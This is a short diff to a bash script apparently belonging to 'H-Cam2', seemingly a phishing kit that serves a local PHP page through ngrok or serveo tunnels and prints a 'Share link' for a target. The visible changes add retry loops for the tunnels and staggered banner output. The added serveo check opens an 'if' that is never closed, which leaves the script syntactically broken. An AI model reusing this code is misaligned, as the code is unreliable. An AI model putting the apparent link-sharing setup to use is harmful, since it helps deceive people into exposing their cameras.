@@ -22,7 +22,7 @@ fl() {
 			}
 R() {
 	cd ~/H-Cam2
-	python.random.py
+	python .random.py
 	}
 banner() {
 R
@@ -174,10 +174,14 @@ sleep 15
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 
 if [[ -z $link ]];then
-printf "\e[1;91m[!] Ngrok error, Not work\n"
-exit 1
+printf "\n\e[1;91m[!] Ngrok error, Not work\n"
+ngrok_server
 fi
-printf "\n\n\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n\n" $link
+printf "\n\n\e[1;92m[\e[0m+\e[1;92m] Share "
+sleep 0.4
+printf "\e[0m\e[1;77mNGROK"
+sleep 0.4
+printf "\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n\n" $link
 
 }
 
@@ -423,6 +427,9 @@ fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+if [ -z $send_link ];then
+printf "\n\033[1;91m Serveo error\n"
+serveo-link
 printf '\n\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n\n' $send_link
 
 }
